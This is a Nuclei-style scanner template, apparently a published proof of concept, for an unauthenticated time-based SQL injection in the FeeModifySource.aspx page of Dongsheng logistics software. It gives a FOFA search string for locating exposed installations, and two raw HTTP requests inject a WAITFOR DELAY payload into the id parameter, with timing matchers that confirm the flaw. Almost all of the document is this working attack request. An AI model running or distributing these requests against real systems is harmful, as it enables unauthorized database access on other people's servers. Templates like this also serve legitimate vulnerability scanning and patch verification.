id: dongsheng-wuliu-ruanjian-feemodifysource-ashx-sql-injection
info:
  name: 东胜物流软件 FeeModifySource.aspx SQL注入
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="东胜物流软件-物流软件"
    东胜物流软件的 FeeModifySource.aspx 组件存在 SQL 注入漏洞。攻击者可通过构造恶意 SQL 查询参数，在未授权情况下执行任意数据库操作，可能导致敏感数据泄露、数据篡改或服务中断。该漏洞源于对用户输入的未充分过滤，允许将恶意 SQL 代码注入到查询语句中。
  tags: 东胜物流软件
http:
- raw:
  - |
    GET /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
  - |
    GET /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
